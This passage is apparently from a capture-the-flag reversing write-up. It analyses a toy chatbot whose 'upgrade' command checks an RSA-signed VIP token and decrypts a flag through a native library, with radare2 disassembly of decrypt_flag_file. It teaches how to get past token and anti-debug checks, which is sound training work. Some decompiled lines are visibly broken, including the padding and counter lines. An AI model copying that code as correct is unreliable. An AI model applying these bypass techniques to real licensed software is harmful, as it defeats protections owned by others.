KEY-----\\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsJftFGJC6RjAC54aMncA\\nfjb2xXeRECiwHuz2wC6QynDd93/7XIrqTObeTpfBCSpOKRLhks6/nzZFTTsYdQCj\\n4roXhWo5lFfH0OTL+164VoKnmUkQ9dppzpmV0Kpk5IQhEyuPYzJfFAlafcHdQvUo\\nidkqcOPpR7hznJPEuRbPxJod34Bph/u9vePKcQQfe+/l/nn02nbfYWTuGtuEdpHq\\nMkktl4WpB50/a5ZqYkW4z0zjFCY5LIPE7mpUNLrZnadBGIaLoVV2lZEBdLt6iLkV\\nHXIr+xNA9ysE304T0JJ/DwM1OXb4yVrtawbFLBu9otOC+Gu0Set+8OjfQvJ+tlT/\\nzQIDAQAB\\n-----END PUBLIC KEY-----\u0026#39; public_key = None try: pub_path = get_resource_path(\u0026#39;public.pem\u0026#39;) if os.path.exists(pub_path): with open(pub_path, \u0026#39;rb\u0026#39;) as f: public_key = serialization.load_pem_public_key(f.read()) else: # inserted public_key = serialization.load_pem_public_key(PUB_PEM) except Exception as e: print(\u0026#39;Failed loading public key:\u0026#39;, e) public_key = None def b64url_encode(b): return base64.urlsafe_b64encode(b).rstrip(b\u0026#39;=\u0026#39;).decode() def b64url_decode(s): s = s | (\u0026#39;=\u0026#39;, 4, len(s) - 4) | 4 return base64.urlsafe_b64decode(s.encode()) def verify_token(token): if not public_key: return (False, \u0026#39;no public key\u0026#39;) try: payload_b64, sig_b64 = token.strip().split(\u0026#39;.\u0026#39;, 1) payload = b64url_decode(payload_b64) sig = b64url_decode(sig_b64) public_key.verify(sig, payload, padding.PKCS1v15(), hashes.SHA256()) j = json.loads(payload.decode()) if j.get(\u0026#39;role\u0026#39;)!= \u0026#39;VIP\u0026#39;: return (False, \u0026#39;role != VIP\u0026#39;) if j.get(\u0026#39;expiry\u0026#39;, 0) \u0026lt; int(time.time()): return (False, \u0026#39;expired\u0026#39;) else: # inserted return (True, j) except Exception as e: return (False, str(e)) def sample_token_nonvip(): payload = json.dumps({\u0026#39;user\u0026#39;: \u0026#39;guest\u0026#39;, \u0026#39;expiry\u0026#39;: int(time.time()) + 3600, \u0026#39;role\u0026#39;: \u0026#39;USER\u0026#39;}).encode() return b64url_encode(payload) def main(): run_integrity_or_exit() print(\u0026#39;=== Bot Chat === \\n 1.chat\\n 2.showtoken\\n 3.upgrade \\n 4.quit\u0026#39;) queries = 0 while True: cmd = input(\u0026#39;\u0026gt; \u0026#39;).strip().lower() if cmd in [\u0026#39;quit\u0026#39;, \u0026#39;exit\u0026#39;]: return if cmd == \u0026#39;chat\u0026#39;: if queries \u0026lt; 3: print(random.choice([\u0026#39;Hi\u0026#39;, \u0026#39;Demo AI\u0026#39;, \u0026#39;Hello!\u0026#39;, \u0026#39;How can I assist you?\u0026#39;, \u0026#39;I am a chatbot\u0026#39;, \u0026#39;What do you want?\u0026#39;, \u0026#39;Tell me more\u0026#39;, \u0026#39;Interesting\u0026#39;, \u0026#39;Go on...\u0026#39;, \u0026#39;SIUUUUUUU\u0026#39;, \u0026#39;I LOVE U\u0026#39;, \u0026#39;HACK TO LEARN NOT LEARN TO HACK\u0026#39;])) queries = queries | 1 else: # inserted print(\u0026#39;Free queries exhausted. Use \\\u0026#39;upgrade\\\u0026#39;\u0026#39;) else: # inserted if cmd == \u0026#39;showtoken\u0026#39;: print(\u0026#39;Token current:\u0026#39; + sample_token_nonvip()) else: # inserted if cmd == \u0026#39;upgrade\u0026#39;: run_integrity_or_exit() token = input(\u0026#39;Paste token: \u0026#39;).strip() ok, info = verify_token(token) if ok: if decrypt_flag_file is None: print(\u0026#39;Native library not available -\u0026gt; cannot decrypt\u0026#39;) else: # inserted flag_path = get_resource_path(\u0026#39;flag.enc\u0026#39;).encode() res_ptr = decrypt_flag_file(flag_path) if not res_ptr: print(\u0026#39;Native failed to decrypt or error\u0026#39;) else: # inserted flag_bytes = ctypes.string_at(res_ptr) try: flag = flag_bytes.decode(errors=\u0026#39;ignore\u0026#39;) except: flag = flag_bytes.decode(\u0026#39;utf-8\u0026#39;, errors=\u0026#39;replace\u0026#39;) print(\u0026#39;=== VIP VERIFIED ===\u0026#39;) print(flag) free_mem(res_ptr) return None print(\u0026#39;Token invalid:\u0026#39;, info) else: # inserted print(\u0026#39;Unknown. Use chat/showtoken/upgrade/quit\u0026#39;) if __name__ == \u0026#39;__main__\u0026#39;: main() Let analyze this python code:\ndef get_resource_path(name): if getattr(sys, \u0026#39;frozen\u0026#39;, False): base = sys._MEIPASS # PyInstaller-style temp dir else: base = os.path.dirname(__file__) # folder containing this .py return os.path.join(base, name) That means all external files are searched next to the program\ndef load_native_lib(name): return CDLL(get_resource_path(name)) if sys.platform == \u0026#39;win32\u0026#39;: LIBNAME = \u0026#39;libnative.dll\u0026#39; else: # inserted LIBNAME = \u0026#39;libnative.so\u0026#39; lib = None check_integrity = None decrypt_flag_file = None free_mem = None try: lib = load_native_lib(LIBNAME) check_integrity = lib.check_integrity check_integrity.argtypes = [c_char_p] check_integrity.restype = c_int decrypt_flag_file = lib.decrypt_flag_file decrypt_flag_file.argtypes = [c_char_p] decrypt_flag_file.restype = c_void_p free_mem = lib.free_mem free_mem.argtypes = [c_void_p] free_mem.restype = None except Exception as e: print(\u0026#39;Warning: native lib not loaded:\u0026#39;, e) lib = None check_integrity = None decrypt_flag_file = None free_mem = None This code tries to load a native library (libnative.dll on Windows or libnative.so on Linux) that exports:\ncheck_integrity(char) -\u0026gt; int decrypt_flag_file(char) -\u0026gt; void free_mem(void) -\u0026gt; None\nIf loading fails, all three become None and the script prints a warning that native lib not loaded.\ndef run_integrity_or_exit(): if check_integrity: ok = check_integrity(sys.executable.encode()) if not ok: print(\u0026#39;[!] Integrity failed or debugger detected. Exiting.\u0026#39;) sys.exit(1) \u0026ldquo;If\u0026rdquo; command show us run_integrity_or_exit() calls check_integrity(sys.executable). If it returns 0, the program print \u0026ldquo;Integrity failed or debugger detected. Exiting\u0026rdquo; then exits.\nPUB_PEM = b\u0026#39;-----BEGIN PUBLIC KEY-----\\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsJftFGJC6RjAC54aMncA\\nfjb2xXeRECiwHuz2wC6QynDd93/7XIrqTObeTpfBCSpOKRLhks6/nzZFTTsYdQCj\\n4roXhWo5lFfH0OTL+164VoKnmUkQ9dppzpmV0Kpk5IQhEyuPYzJfFAlafcHdQvUo\\nidkqcOPpR7hznJPEuRbPxJod34Bph/u9vePKcQQfe+/l/nn02nbfYWTuGtuEdpHq\\nMkktl4WpB50/a5ZqYkW4z0zjFCY5LIPE7mpUNLrZnadBGIaLoVV2lZEBdLt6iLkV\\nHXIr+xNA9ysE304T0JJ/DwM1OXb4yVrtawbFLBu9otOC+Gu0Set+8OjfQvJ+tlT/\\nzQIDAQAB\\n-----END PUBLIC KEY-----\u0026#39; public_key = None try: pub_path = get_resource_path(\u0026#39;public.pem\u0026#39;) if os.path.exists(pub_path): with open(pub_path, \u0026#39;rb\u0026#39;) as f: public_key = serialization.load_pem_public_key(f.read()) else: # inserted public_key = serialization.load_pem_public_key(PUB_PEM) except Exception as e: print(\u0026#39;Failed loading public key:\u0026#39;, e) public_key = None It load an RSA public key: If a public.pem is next to the program it will use this file,else it turn back into PUB_PEM. The next explaination will be copied from chatGPT(because i so lazyğŸ¥±):\nThe â€œJWTâ€ format used here (important!)\nThis is not a standard 3-part JWT. The code expects exactly two parts:\ntoken = \u0026#34;\u0026lt;payload_b64url\u0026gt;.\u0026lt;signature_b64url\u0026gt;\u0026#34; +)The signed content is just the raw payload bytes (no header).\n+)Signature algorithm: RSA PKCS#1 v1.5 with SHA-256 (public_key.verify(sig, payload, PKCS1v15(), SHA256())).\n+)The payload is JSON and must include:\n-\u0026ldquo;role\u0026rdquo;: \u0026ldquo;VIP\u0026rdquo; -\u0026ldquo;expiry\u0026rdquo;: \u0026lt;unix_time_in_future\u0026gt;\n+)So a valid token = base64url(JSON) + â€œ.â€ + base64url(RSA_signature_over_raw_payload).\nLet go with our main job:Reverse!\rSo in this code if we can reverse the .so file we can find the decode flag function To find the address of decrypt_flag_file we use:\nnm -D libnative.so | grep -E \u0026#39;decrypt_flag_file\u0026#39; The output is:\n0000000000001610 T decrypt_flag_file Let open libnative.so in radare2 Because cannot determine entrypoint, radare2 will use 0x00001220 at first\nâ”€$ r2 -w -e bin.cache=true -e bin.relocs.apply=true -A libnative.so ERROR: Cannot determine entrypoint, using 0x00001220 INFO: Analyze all flags starting with sym. and entry0 (aa) INFO: Analyze imports (af@@@i) INFO: Analyze entrypoint (af@ entry0) INFO: Analyze symbols (af@@@s) INFO: Analyze all functions arguments/locals (afva@@@F) INFO: Analyze function calls (aac) INFO: Analyze len bytes of instructions for references (aar) INFO: Finding and parsing C++ vtables (avrr) INFO: Analyzing methods (af @@ method.*) INFO: Recovering local variables (afva@@@F) INFO: Type matching analysis for all functions (aaft) INFO: Propagate noreturn information (aanr) INFO: Use -AA or aaaa to perform additional experimental analysis [0x00001220]\u0026gt; Let see the disassenbly decrypt_flag_file and the pseudo-c of this function\ns 0x00001610(point to 0x1610) af @ 0x00001610(define function) pdf @ 0x00001610(print disassembly function) pdc @ 0x00001610(decompile to pseudo-C) The Output is:\n[0x00001220]\u0026gt; s 0x00001610 [0x00001610]\u0026gt; af @ 0x00001610 [0x00001610]\u0026gt; pdf @ 0x00001610 ;-- rip: â”Œ 579: sym.decrypt_flag_file (int64_t arg1); â”‚ `- args(rdi) vars(4:sp[0x10..0x54]) â”‚ 0x00001610 4157 push r15 â”‚ 0x00001612 4156 push r14 â”‚ 0x00001614 4155 push r13 â”‚ 0x00001616 4154 push r12 â”‚ 0x00001618 55 push rbp â”‚ 0x00001619 53 push rbx â”‚ 0x0000161a 4889fb mov rbx, rdi ; arg1 â”‚ 0x0000161d 4883ec28 sub rsp, 0x28 â”‚ 0x00001621 e8bafcffff call sym.env_checks_ok â”‚ 0x00001626 85c0 test eax, eax â”‚ â”Œâ”€\u0026lt; 0x00001628 0f84b2010000 je 0x17e0 â”‚ â”‚ 0x0000162e 48c7442408.. mov qword [var_8h], 0 â”‚ â”‚ 0x00001637 488d7c2408 lea rdi, [var_8h] â”‚ â”‚ 0x0000163c e87ffaffff call fcn.000010c0 â”‚ â”‚ 0x00001641 4989c4 mov r12, rax â”‚ â”‚ 0x00001644 4885c0 test rax, rax â”‚ â”Œâ”€â”€\u0026lt; 0x00001647 0f8493010000 je 0x17e0 â”‚ â”‚â”‚ 0x0000164d 48837c24080f cmp qword [var_8h], 0xf â”‚ â”Œâ”€â”€â”€\u0026lt; 0x00001653 0f8677010000 jbe 0x17d0 â”‚ â”‚â”‚â”‚ 0x00001659 4889df mov rdi, rbx ; const char *filename â”‚ â”‚â”‚â”‚ 0x0000165c 488d35c609.. lea rsi, [0x00002029] ; \u0026#34;rb\u0026#34; ; const char *mode â”‚ â”‚â”‚â”‚ 0x00001663 e828fbffff call sym.imp.fopen ; file*fopen(const char *filename, const char *mode) â”‚ â”‚â”‚â”‚ 0x00001668 4889c3 mov rbx, rax â”‚ â”‚â”‚â”‚ 0x0000166b 4885c0 test rax, rax â”‚ â”Œâ”€â”€â”€â”€\u0026lt; 0x0000166e 0f845c010000 je 0x17d0 â”‚ â”‚â”‚â”‚â”‚ 0x00001674 31f6 xor esi, esi ; long offset â”‚ â”‚â”‚â”‚â”‚ 0x00001676 ba02000000 mov edx, 2 ; int whence â”‚ â”‚â”‚â”‚â”‚ 0x0000167b 4889c7 mov rdi, rax ; FILE *stream â”‚ â”‚â”‚â”‚â”‚ 0x0000167e e8edfaffff call sym.imp.fseek ; int fseek(FILE *stream, long offset, int whence) â”‚ â”‚â”‚â”‚â”‚ 0x00001683 4889df mov rdi, rbx ; FILE *stream â”‚ â”‚â”‚â”‚â”‚ 0x00001686 e8a5f9ffff call sym.imp.ftell ; long ftell(FILE *stream) â”‚ â”‚â”‚â”‚â”‚ 0x0000168b 31d2 xor edx, edx ; int whence â”‚ â”‚â”‚â”‚â”‚ 0x0000168d 31f6 xor esi, esi ; long offset â”‚ â”‚â”‚â”‚â”‚ 0x0000168f 4889df mov rdi, rbx ; FILE *stream â”‚ â”‚â”‚â”‚â”‚ 0x00001692 4889c5 mov rbp, rax â”‚ â”‚â”‚â”‚â”‚ 0x00001695 e8d6faffff call sym.imp.fseek ; int fseek(FILE *stream, long offset, int whence) â”‚ â”‚â”‚â”‚â”‚ 0x0000169a 4883fd10 cmp rbp, 0x10 â”‚ â”Œâ”€â”€â”€â”€â”€\u0026lt; 0x0000169e 0f8e64010000 jle 0x1808 â”‚ â”‚â”‚â”‚â”‚â”‚ 0x000016a4 4889ef mov rdi, rbp ; size_t size â”‚ â”‚â”‚â”‚â”‚â”‚ 0x000016a7 e804fbffff call sym.imp.malloc ; void *malloc(size_t size) â”‚ â”‚â”‚â”‚â”‚â”‚ 0x000016ac 4989c5 mov r13, rax â”‚ â”‚â”‚â”‚â”‚â”‚ 0x000016af 4885c0 test rax, rax â”‚ â”Œâ”€â”€â”€â”€â”€â”€\u0026lt; 0x000016b2 0f8450010000 je 0x1808 â”‚ â”‚â”‚â”‚â”‚â”‚â”‚ 0x000016b8 4889d9 mov rcx, rbx ; FILE *stream â”‚ â”‚â”‚â”‚â”‚â”‚â”‚ 0x000016bb 4889ea mov rdx, rbp ; size_t nmemb â”‚ â”‚â”‚â”‚â”‚â”‚â”‚ 0x000016be be01000000 mov esi, 1 ; size_t size â”‚ â”‚â”‚â”‚â”‚â”‚â”‚ 0x000016c3 4889c7 mov rdi, rax ; void *ptr â”‚ â”‚â”‚â”‚â”‚â”‚â”‚ 0x000016c6 e8f5faffff call sym.imp.fread ; size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream) â”‚ â”‚â”‚â”‚â”‚â”‚â”‚ 0x000016cb 4889df mov rdi, rbx ; FILE *stream â”‚ â”‚â”‚â”‚â”‚â”‚â”‚ 0x000016ce 4d8d7510 lea r14, [r13 + 0x10] â”‚ â”‚â”‚â”‚â”‚â”‚â”‚ 0x000016d2 448d7df0 lea r15d, [var_10h] â”‚ â”‚â”‚â”‚â”‚â”‚â”‚ 0x000016d6 e855faffff call sym.imp.fclose ; int fclose(FILE *stream) â”‚ â”‚â”‚â”‚â”‚â”‚â”‚ 0x000016db f3410f6f4500 movdqu xmm0, xmmword [r13] â”‚ â”‚â”‚â”‚â”‚â”‚â”‚ 0x000016e1 0f29442410 movaps xmmword [var_sp_10h], xmm0 â”‚ â”‚â”‚â”‚â”‚â”‚â”‚ 0x000016e6 e805faffff call sym.imp.EVP_CIPHER_CTX_new â”‚ â”‚â”‚â”‚â”‚â”‚â”‚ 0x000016eb 4889c3 mov rbx, rax â”‚ â”‚â”‚â”‚â”‚â”‚â”‚ 0x000016ee 4885c0 test rax, rax â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€\u0026lt; 0x000016f1 0f8459010000 je 0x1850 â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x000016f7 48837c24081f cmp qword [var_8h], 0x1f â”‚ â”€â”€â”€â”€â”€â”€â”€â”€\u0026lt; 0x000016fd 0f86f5000000 jbe 0x17f8 â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x00001703 e8d8f9ffff call sym.imp.EVP_aes_256_cbc â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x00001708 4889c6 mov rsi, rax â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ ; CODE XREF from sym.decrypt_flag_file @ 0x1800(x) â”‚ â”€â”€â”€â”€â”€â”€â”€â”€\u0026gt; 0x0000170b 31d2 xor edx, edx â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x0000170d 4c8d442410 lea r8, [var_sp_10h] â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x00001712 4c89e1 mov rcx, r12 â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x00001715 4889df mov rdi, rbx â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x00001718 e833f9ffff call sym.imp.EVP_DecryptInit_ex â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x0000171d 85c0 test eax, eax â”‚ â”€â”€â”€â”€â”€â”€â”€â”€\u0026lt; 0x0000171f 0f8423010000 je 0x1848 â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x00001725 4863fd movsxd rdi, ebp ; size_t size â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x00001728 e883faffff call sym.imp.malloc ; void *malloc(size_t size) â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x0000172d 4889e2 mov rdx, rsp â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x00001730 4589f8 mov r8d, r15d â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x00001733 4c89f1 mov rcx, r14 â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x00001736 4889c6 mov rsi, rax â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x00001739 4889df mov rdi, rbx â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x0000173c c704240000.. mov dword [rsp], 0 â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x00001743 4889c5 mov rbp, rax â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x00001746 c744240400.. mov dword [var_4h], 0 â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x0000174e e87df9ffff call sym.imp.EVP_DecryptUpdate â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x00001753 85c0 test eax, eax â”‚ â”€â”€â”€â”€â”€â”€â”€â”€\u0026lt; 0x00001755 0f84c5000000 je 0x1820 â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x0000175b 48633424 movsxd rsi, dword [rsp] â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x0000175f 488d542404 lea rdx, [var_4h] â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x00001764 4889df mov rdi, rbx â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x00001767 4801ee add rsi, rbp â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x0000176a e801f9ffff call sym.imp.EVP_DecryptFinal_ex â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x0000176f 85c0 test eax, eax â”‚ â”€â”€â”€â”€â”€â”€â”€â”€\u0026lt; 0x00001771 0f84a9000000 je 0x1820 â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x00001777 448b7c2404 mov r15d, dword [var_4h] â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x0000177c 44033c24 add r15d, dword [rsp] â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x00001780 418d7f01 lea edi, [r15 + 1] â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x00001784 4863ff movsxd rdi, edi ; size_t size â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x00001787 e824faffff call sym.imp.malloc ; void *malloc(size_t size) â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x0000178c 4989c6 mov r14, rax â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x0000178f 4885c0 test rax, rax â”‚ â”€â”€â”€â”€â”€â”€â”€â”€\u0026lt; 0x00001792 0f8488000000 je 0x1820 â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x00001798 4d63ff movsxd r15, r15d â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x0000179b 4889ee mov rsi, rbp ; const void *s2 â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x0000179e 4889c7 mov rdi, rax ; void *s1 â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x000017a1 4c89fa mov rdx, r15 ; size_t n â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x000017a4 e857f9ffff call sym.imp.memcpy ; void *memcpy(void *s1, const void *s2, size_t n) â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x000017a9 43c6043e00 mov byte [r14 + r15], 0 â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x000017ae 4889df mov rdi, rbx â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x000017b1 e89af9ffff call sym.imp.EVP_CIPHER_CTX_free â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x000017b6 4889ef mov rdi, rbp ; void *ptr â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x000017b9 e8e2f9ffff call sym.imp.free ; void free(void *ptr) â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x000017be 4c89ef mov rdi, r13 ; void *ptr â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x000017c1 e8daf9ffff call sym.imp.free ; void free(void *ptr) â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x000017c6 4c89e7 mov rdi, r12 ; void *ptr â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ 0x000017c9 e8d2f9ffff call sym.imp.free ; void free(void *ptr) â”‚ â”€â”€â”€â”€â”€â”€â”€â”€\u0026lt; 0x000017ce eb13 jmp 0x17e3 â”‚ â”‚â”‚â”‚â”‚â”‚â”‚â”‚ ; CODE XREFS from sym.decrypt_flag_file @ 0x1653(x), 0x166e(x) â”‚ â”‚â”‚â”‚â””â””â”€â”€â”€\u0026gt; 0x000017d0 4c89e7 mov rdi, r12 ; void *ptr â”‚ â”‚â”‚â”‚ â”‚â”‚ 0x000017d3 e8c8f9ffff call sym.imp.free ; void free(void *ptr) â”‚ â”‚â”‚â”‚ â”‚â”‚ 0x000017d8 0f1f840000.. nop dword [rax + rax] â”‚ â”‚â”‚â”‚ â”‚â”‚ ; CODE XREFS from sym.decrypt_flag_file @ 0x1628(x), 0x1647(x), 0x1818(x), 0x1840(x), 0x1860(x) â”‚ â”€â”€â”€â”Œâ”Œâ””â””â”€\u0026gt; 0x000017e0 4531f6 xor r14d, r14d â”‚ â”‚â”‚â”‚â•â• ; CODE XREF from sym.decrypt_flag_file @ 0x17ce(x) â”‚ â”€â”€â”€â”€â”€â”€â”€â”€\u0026gt; 0x000017e3 4883c428 add rsp, 0x28 â”‚ â”‚â”‚â”‚â•â• 0x000017e7 4c89f0 mov rax, r14 â”‚ â”‚â”‚â”‚â•â• 0x000017ea 5b pop rbx â”‚ â”‚â”‚â”‚â•â• 0x000017eb 5d pop rbp â”‚ â”‚â”‚â”‚â•â• 0x000017ec 415c pop r12 â”‚ â”‚â”‚â”‚â•â• 0x000017ee 415d pop r13 â”‚ â”‚â”‚â”‚â•â• 0x000017f0 415e pop r14 â”‚ â”‚â”‚â”‚â•â• 0x000017f2 415f pop r15 â”‚ â”‚â”‚â”‚â•â• 0x000017f4 c3 ret .. â”‚ â”‚â”‚â”‚â•â• ; CODE XREF from sym.decrypt_flag_file @ 0x16fd(x) â”‚ â”€â”€â”€â”€â”€â”€â”€â”€\u0026gt; 0x000017f8 e8b3f8ffff call sym.imp.EVP_aes_128_cbc â”‚ â”‚â”‚â”‚â•â• 0x000017fd 4889c6 mov rsi, rax â”‚ â”€â”€â”€â”€â”€â”€â”€â”€\u0026lt; 0x00001800 e906ffffff jmp 0x170b .. â”‚ â”‚â”‚â”‚â•â• ; CODE XREFS from sym.decrypt_flag_file @ 0x169e(x), 0x16b2(x) â”‚ â”‚â””â””â”€â”€â”€â”€â”€\u0026gt; 0x00001808 4889df mov rdi, rbx ; FILE *stream â”‚ â”‚ â•â• 0x0000180b e820f9ffff call sym.imp.fclose ; int fclose(FILE *stream) â”‚ â”‚ â•â• 0x00001810 4c89e7 mov rdi, r12 ; void *ptr â”‚ â”‚ â•â• 0x00001813 e888f9ffff call sym.imp.free ; void free(void *ptr) â”‚ â”€â”€â”€â”€â”€â”€â”€â”€\u0026lt; 0x00001818 ebc6 jmp 0x17e0 .. â”‚ â”‚ â•â• ; CODE XREFS from sym.decrypt_flag_file @ 0x1755(x), 0x1771(x), 0x1792(x) â”‚ â”€â”€â”€â”€â”€â”€â”€â”€\u0026gt; 0x00001820 4889df mov rdi, rbx â”‚ â”‚ â•â• 0x00001823 e828f9ffff call sym.imp.EVP_CIPHER_CTX_free â”‚ â”‚ â•â• 0x00001828 4c89ef mov rdi, r13 ; void *ptr â”‚ â”‚ â•â• 0x0000182b e870f9ffff call sym.imp.free ; void free(void *ptr) â”‚ â”‚ â•â• 0x00001830 4c89e7 mov rdi, r12 ; void *ptr â”‚ â”‚ â•â• 0x00001833 e868f9ffff call sym.imp.free ; void free(void *ptr) â”‚ â”‚ â•â• 0x00001838 4889ef mov rdi, rbp ; void *ptr â”‚ â”‚ â•â• 0x0000183b e860f9ffff call sym.imp.free ; void free(void *ptr) â”‚ â”‚ â””â”€â”€â”€â”€\u0026lt; 0x00001840 eb9e jmp 0x17e0 .. â”‚ â”‚ â• ; CODE XREF from sym.decrypt_flag_file @ 0x171f(x) â”‚ â”€â”€â”€â”€â”€â”€â”€â”€\u0026gt; 0x00001848 4889df mov rdi, rbx â”‚ â”‚ â• 0x0000184b e800f9ffff call sym.imp.EVP_CIPHER_CTX_free â”‚ â”‚ â• ; CODE XREF from sym.decrypt_flag_file @ 0x16f1(x) â”‚ â””â”€â”€â”€â”€â”€â”€â”€\u0026gt; 0x00001850 4c89ef mov rdi, r13 ; void *ptr â”‚ â• 0x00001853 e848f9ffff call sym.imp.free ; void free(void *ptr) â”‚ â• 0x00001858 4c89e7 mov rdi, r12 ; void *ptr â”‚ â• 0x0000185b e840f9ffff call sym.imp.free ; void free(void *ptr) â”” â””â”€â”€â”€\u0026lt; 0x00001860 e97bffffff jmp 0x17e0 [0x00001610]\u0026gt; pdc @ 0x00001610 // callconv: rax amd64 (rdi, rsi, rdx, rcx, r8, r9, xmm0, xmm1, xmm2, xmm3, xmm4); void sym.decrypt_flag_file (int64_t arg1) { loc_0x00001610: push (r15) push (r14) push (r13) push (r12) push (rbp) push (rbx) rbx = rdi // arg1 rsp -= 0x28 // (cstr 0x00000020) \u0026#34;@\u0026#34; sym.env_checks_ok () v = eax \u0026amp; eax if (!v) goto loc_0x17e0 // likely goto loc_0x0000162e; loc_0x000017e0: // CODE XREFS from sym.decrypt_flag_file @ 0x1628(x), 0x1647(x), 0x1818(x), 0x1840(x), 0x1860(x) r14d = 0 loc_0x000017e3: // CODE XREF from sym.decrypt_flag_file @ 0x17ce(x) rsp += 0x28 rax = r14 rbx = pop () rbp = pop () r12 = pop () r13 = pop () r14 = pop () r15 = pop () return goto loc_0x0000164d; return rax; loc_0x0000164d: v = qword [var_8h] - 0xf if (((unsigned) v) \u0026lt;= 0) goto 0x17d0 // likely goto loc_0x00001659; loc_0x000017d0: // CODE XREFS from sym.decrypt_flag_file @ 0x1653(x), 0x166e(x) rdi = r12 // void *ptr sym.imp.free () // void free(0) goto loc_0x000017e0 loc_0x00001659: // orphan rdi = rbx // const char *filename rsi = rip + 0x9c6 // \u0026#34;rb\u0026#34; // 0x2029 // const char *mode sym.imp.fopen () // file*fopen(0, \u0026#34;rb\u0026#34;) rbx = rax v = rax \u0026amp; rax if (!v) goto loc_0x000017d0 loc_0x00001674: // orphan esi = 0 // long offset edx = 2 // int whence rdi = rax // FILE *stream sym.imp.fseek () // int fseek(0, 0, 0x00000000) rdi = rbx // FILE *stream sym.imp.ftell () // long ftell(0) edx = 0 // int whence esi = 0 // long offset rdi = rbx // FILE *stream rbp = rax sym.imp.fseek () // int fseek(0, 0, 0) v = rbp - 0x10 if (v \u0026lt;= 0) goto loc_0x00001808 loc_0x000016a4: // orphan rdi = rbp // size_t size // rsp sym.imp.malloc () // void *malloc(0x00000000) r13 = rax v = rax \u0026amp; rax if (!v) goto loc_0x00001808 loc_0x000016b8: // orphan rcx = rbx // FILE *stream rdx = rbp // size_t nmemb // rsp esi = 1 // size_t size rdi = rax // void *ptr sym.imp.fread () // size_t fread(0, 0x00000000, 0x00000000, 0) rdi = rbx // FILE *stream r14 = r13 + 0x10 r15d = var_10h sym.imp.fclose () // int fclose(0) xmm0 = xmmword [r13] xmmword [var_sp_10h] = xmm0 sym.imp.EVP_CIPHER_CTX_new () rbx = rax v = rax \u0026amp; rax if (!v) goto loc_0x00001850 loc_0x000016f7: // orphan v = qword [var_8h] - 0x1f if (((unsigned) v) \u0026lt;= 0) goto loc_0x000017f8 loc_0x00001703: // orphan sym.imp.EVP_aes_256_cbc () rsi = rax loc_0x0000170b: // orphan // CODE XREF from sym.decrypt_flag_file @ 0x1800(x) edx = 0 r8 = var_sp_10h rcx = r12 rdi = rbx sym.imp.EVP_DecryptInit_ex () v = eax \u0026amp; eax if (!v) goto loc_0x00001848 loc_0x00001725: // orphan rdi = ebp // size_t size // rsp sym.imp.malloc () // void *malloc(0x00000000) rdx = rsp r8d = r15d rcx = r14 rsi = rax rdi = rbx dword [rsp] = 0 rbp = rax dword [var_4h] = 0 sym.imp.EVP_DecryptUpdate () v = eax \u0026amp; eax if (!v) goto loc_0x00001820 loc_0x0000175b: // orphan rsi = dword [rsp] rdx = var_4h rdi = rbx rsi += rbp // rsp sym.imp.EVP_DecryptFinal_ex () v = eax \u0026amp; eax if (!v) goto loc_0x00001820 loc_0x00001777: // orphan r15d = dword [var_4h] r15d += dword [rsp] edi = r15 + 1 rdi = edi // size_t size 